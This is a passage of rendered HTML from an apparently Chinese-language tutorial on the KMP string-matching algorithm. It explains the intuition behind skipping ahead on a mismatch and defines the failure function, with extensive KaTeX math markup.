style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的。</p><h1 id="kmp算法"><a class="markdownIt-Anchor" href="#kmp算法"></a> KMP算法</h1><p>  KMP算法是一个很好的解决算法，它可以 <strong>最多只扫描一次字符串<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span></strong> 就能完成任务，即它的算法复杂度是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的。之所以被叫作KMP算法，是因为它是由Knuth、Morris、Pratt三个人提出的。下面来介绍一下该算法的思想。</p><h2 id="简单的直观模拟"><a class="markdownIt-Anchor" href="#简单的直观模拟"></a> 简单的直观模拟</h2><p>  为了说明KMP的大致过程，我们先给出一个例子。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/03/nSwYj.webp" alt="一个例子" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">一个例子</span></div></div><p>  我们参考上例，并且称大数组为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">ch</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span></span></span></span>，目标数组为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">target</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span></span></span></span>。我们从第一位开始逐个比较<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">ch</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">target</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span></span></span></span>中的每一位，直到不匹配为止，如图(a)所示。我们发现，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mn>6</mn><mo stretchy="false">]</mo><mo stretchy="false">!</mo><mo>=</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[6]!=target[6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord">6</span><span class="mclose">]</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">6</span><span class="mclose">]</span></span></span></span>。但是在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>⩽</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">i\leqslant 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.79619em;vertical-align:-0.13667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>都有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[i]=target[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span>。我们此时不将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">target</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span></span></span></span>往后移动一位，选择往后移动两位，因为**这个时候<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span></span></span></span>到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord">6</span><span class="mclose">]</span></span></span></span>仍然和目标字符串是匹配的。**我们可以证明，这个位置是除了初始位置外第二个可能的匹配发生的位置。<strong>因为如果在此之前还存在一个匹配的字符串，那么我们要么已经找到了它，要么重定位会定位到它，而不是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span></span></span></span></strong> 。如果你能理解这点，这就是KMP算法的基本原理。</p><h2 id="失效函数"><a class="markdownIt-Anchor" href="#失效函数"></a> 失效函数</h2><h3 id="失效函数原理"><a class="markdownIt-Anchor" href="#失效函数原理"></a> 失效函数原理</h3><p>  那么随之而来的问题是：<strong>我们如何确定应该向后移动几位呢？</strong> 以及，如果每次向后移动都可以看做字符串<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">target</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span></span></span></span>正在比较元素的<strong>后退</strong>，<em>（正如上例中本在比较<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">6</span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord">6</span><span class="mclose">]</span></span></span></span>，向后移动后相当于比较<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mn>4</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[4]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">4</span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord">6</span><span class="mclose">]</span></span></span></span>）</em> 那么到底<strong>后退几位呢？</strong> 如果我们把字符串中正在比较的元素位置记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>，后退后正在比较<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>j</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">j^\prime</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span>，那么我们可以知道它们满足：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span>到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><msup><mi>j</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j^\prime]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>之间的字符串和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><msup><mi>j</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j-j^\prime]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>之间的字符串<strong>完全相同</strong>。这里需要读者仔细理解一下，我们实际上取的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>j</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">j^\prime</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span>是使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">target</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span></span></span></span>中前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>j</mi><mo mathvariant="normal">′</mo></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">j^\prime+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>和后<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>j</mi><mo mathvariant="normal">′</mo></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">j^\prime+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>个字符完全相同，也就是我们在前一节说的直观模拟的结果。</p><p>  我们把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>j</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">j^\prime</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span>的对应关系称为<strong>失效函数</strong>，即</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>j</mi><mo mathvariant="normal">′</mo></msup><mo>=</mo><mi>P</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">j^\prime =P[j].</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.996332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mord">.</span></span></span></span></span></p><p>有了这个对应关系，我们就可以轻松决定，当字符串正在比较位置<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i,j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>相同，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[i]=target[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>时，但位置<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i+1,j+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>不同，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo><mo mathvariant="normal">≠</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[i+1]\neq target[j+1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord 